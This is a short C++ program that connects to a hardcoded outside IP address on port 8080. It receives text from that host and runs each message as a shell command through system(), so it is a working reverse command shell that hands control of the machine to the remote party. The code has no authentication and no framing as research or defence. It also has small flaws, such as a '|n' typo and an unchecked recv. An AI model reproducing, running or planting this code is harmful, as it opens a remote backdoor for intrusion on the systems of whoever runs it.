#include <cstdio>
#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string>
#include <cstring>

int main(){
    int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("socket create error!|n");
        close(sockfd);
        return 1;
    }

    std::string ip = "110.54.231.113";
    int port = 8080;
    
    struct sockaddr_in sockaddr;
    memset(&sockaddr, 0, sizeof(sockaddr));
    sockaddr.sin_family = AF_INET;
    sockaddr.sin_addr.s_addr = inet_addr(ip.c_str());
    sockaddr.sin_port = htons(port);

    if (connect(sockfd, (struct sockaddr *)&sockaddr, sizeof(sockaddr))) {
        perror("socket connect fail!\n");
        close(sockfd);
        return 1;
    }
    else
        std::cout << "connect success!\n";

    char exit[1024] = {0};
    while (strcmp(exit, "exit") != 0) {
        char buf[1024] = {0};
        recv(sockfd, buf, sizeof(buf), 0);
        system(buf);

        std::cout << "Please reply!\nIf you want to quit,please type \"exit\"!Otherwise,type anything!\n";
        std::cin >> exit;
        send(sockfd, exit, sizeof(exit), 0);
    }

    return 0;
}